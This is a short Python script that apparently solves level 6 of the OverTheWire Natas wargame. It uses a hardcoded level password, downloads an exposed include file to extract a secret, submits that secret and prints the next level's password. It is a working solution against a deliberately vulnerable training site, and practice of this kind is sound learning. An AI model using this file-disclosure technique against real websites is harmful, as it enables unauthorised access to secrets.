#!/usr/local/bin/env python
import requests
import re

username = "natas6"
password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'

url = 'http://%s.natas.labs.overthewire.org/includes/secret.inc' % username

response = requests.get(url, auth=(username, password))

content = response.text

# print(content)
secret = re.findall('"(.*)"', content)[0]

url = 'http://%s.natas.labs.overthewire.org' % username
response = requests.post(url, data={"secret": secret, "submit": "submit"}, auth=(username, password))
content = response.text
print(re.findall('Access granted. The password for natas7 is (.*)', content)[0])
